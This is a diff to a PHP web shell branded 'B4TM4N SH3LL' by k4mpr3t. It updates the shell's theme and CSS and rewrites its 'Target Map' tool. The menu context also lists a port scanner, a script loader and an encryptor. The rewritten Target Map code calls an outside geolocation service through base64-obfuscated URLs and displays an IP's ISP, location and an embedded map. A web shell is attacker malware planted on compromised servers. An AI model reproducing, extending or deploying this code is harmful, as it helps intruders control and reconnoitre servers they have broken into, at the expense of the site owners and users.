@@ -33,7 +33,7 @@ $x_="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a";
 $config=array(
 	"title"     => "B4TM4N SH3LL",                 // Your Title
 	"subtitle"  => "V3RS10N 2.7 ~ k4mpr3t",        // Your Subtitle
-	"themes"    => "BR34K",                        // Your Themes (D4RK or BR34K)
+	"themes"    => "br34k",                        // Your Themes (D4RK or BR34K)
 	"debug"     => false                           // Debug Mode
 );
 
@@ -400,7 +400,7 @@ $start=microtime(true);                    // Time Pageload
 	.frmsource{margin-top:10px}
 	.hexdump{width:100%;padding:5px;margin-bottom:5px}
 	.hexdump td{text-align:left}
-	.highlight{background:var(--txt-hover-color);word-break:break-word;padding:15px;margin-bottom:5px;height:300px;overflow:auto}
+	.highlight{background:var(--background-color);word-break:break-word;padding:15px;margin-bottom:5px;height:300px;overflow:auto}
 	.hash-capture{display:inline-block;width:100%}
 	.hash-capture-left{float:left;width:49%}
 	.hash-capture-right{float:right;width:49%}
@@ -3160,7 +3160,7 @@ if(any("z",$_REQUEST))
 	$z=$_REQUEST['z'];
 
 	print MenuTools(array(
-	"target-map"=>array("title"=>"Target Map","ver"=>"1.0","auth"=>"k4mpr3t"),
+	"target-map"=>array("title"=>"Target Map","ver"=>"2.0","auth"=>"k4mpr3t"),
 	"port-scanner"=>array("title"=>"Scan Port","ver"=>"1.0","auth"=>"k4mpr3t"),
 	"script-loader"=>array("title"=>"Script Loader","ver"=>"1.0","auth"=>"k4mpr3t"),
 	"encryptor"=>array("title"=>"Encryptor","ver"=>"1.1","auth"=>"k4mpr3t"),
@@ -3201,21 +3201,56 @@ if(any("z",$_REQUEST))
 			$valid=filter_var($ip,FILTER_VALIDATE_IP) or die('Invalid IP Address');
 			if($_REQUEST['ip']==gethostbyname(http_host)) 
 			{
-				$url=B64D("zSI9xWleO7AbADEmAD0kxX4fACJezmMeyt==");
+				$url=B64D("zSI9xWleO7odODUdzH4qy79ezmMeyr1=");
 				$geoip=GetUrlContent($url);
 				$json=json_decode($geoip,true);
-				$ip=$json['query'];
 			}
-			$url=sprintf(B64D("zSI9xWleO7AbADEmAD0kxX4fACJezmMeyt==")."/%s",$ip);
-			$geoip=GetUrlContent($url);
-			$json=json_decode($geoip,true);
-			$url=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$json['latitude'],$json['longitude']);
-			printf("<h3 align='center'><font class='on'>%s (%s) | %s, %s</font></h3><br>
+			else
+			{
+				$url=sprintf(B64D("zSI9xWleO7odODUdzH4qy79ezmMeyr1=")."%s",$ip);
+				$geoip=GetUrlContent($url);
+				$json=json_decode($geoip,true);
+			}
+			$url=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$json['lat'],$json['lon']);
+			printf("<div class='divide'>
+						<div class='divide-left'>
+							<table class='table'>
+								<tr><td>AS</td><td>%s</td></tr>
+								<tr><td>City</td><td>%s</td></tr>
+								<tr><td>Country</td><td>%s</td></tr>
+								<tr><td>Country Code</td><td>%s</td></tr>
+								<tr><td>ISP</td><td>%s</td></tr>
+								<tr><td>Latitude</td><td>%s</td></tr>
+								<tr><td>Logitude</td><td>%s</td></tr>
+							</table>
+						</div>
+						<div class='divide-left'>
+							<table class='table'>
+								<tr><td>Origin</td><td>%s</td></tr>
+								<tr><td>IP</td><td>%s</td></tr>
+								<tr><td>Region</td><td>%s</td></tr>
+								<tr><td>Region Name</td><td>%s</td></tr>
+								<tr><td>Timezone</td><td>%s</td></tr>
+								<tr><td>Zip</td><td>%s</td></tr>
+								<tr><td>Status</td><td>%s</td></tr>
+							</table>
+						</div>
+					</div>
 					<iframe src='%s' width='100%%' height='345' frameBorder='0'><iframe>",
-					$json['country_name'],
-					$json['country_code'],
+					$json['as'],
 					$json['city'],
-					$json['region_name'],
+					$json['country'],
+					$json['countryCode'],
+					$json['isp'],
+					$json['lat'],
+					$json['lon'],
+					$json['org'],
+					$json['query'],
+					$json['region'],
+					$json['regionName'],
+					$json['timezone'],
+					$json['zip'],
+					$json['status'],
 					$url);
 			exit;
 		}
